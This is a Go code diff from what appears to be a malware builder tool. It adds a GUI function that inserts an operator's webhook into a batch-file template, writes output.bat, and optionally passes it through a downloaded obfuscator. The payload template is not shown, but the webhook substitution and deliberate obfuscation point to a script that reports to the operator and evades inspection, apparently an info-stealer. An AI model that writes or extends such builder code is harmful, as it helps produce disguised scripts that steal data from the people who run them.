@@ -1,13 +1,45 @@
 package batch
 
 import (
+	"fmt"
 	"io"
 	"net/http"
 	"os"
 	"os/exec"
+	"strings"
+
+	"builder/modules/options/utils"
+
+	"fyne.io/fyne/v2"
 )
 
-func ObfuscateCode(file string) error {
+func BuildBatchFile(a fyne.App, webhook string, obfuscate bool) {
+	cwd, err := os.Getwd()
+	if err != nil {
+		fmt.Println(err)
+	}
+	if !(utils.TestWebhook(a, webhook)) {
+		return
+	}
+	batchCode := utils.GetBatCode()
+	batchCode = strings.Replace(batchCode, "YOUR_WEBHOOK_HERE2", webhook, -1)
+	err = os.WriteFile("output.bat", []byte(batchCode), 0644)
+	if err != nil {
+		fmt.Println(err)
+	} else {
+		if obfuscate {
+			utils.MakeSuccessMessage(a, "test")
+			err = obfuscateCode("output.bat")
+			if err != nil {
+				utils.MakeErrorMessage(a, "An error occured while obfuscating the code"+err.Error())
+				return
+			}
+		}
+		utils.MakeSuccessMessage(a, "Compiled BAT file successfully! Location is at "+cwd+"\\output.bat")
+	}
+}
+
+func obfuscateCode(file string) error {
 	somalifuscatorPath, err := downloadSomalifuscatorV2()
 	if err != nil {
 		return err
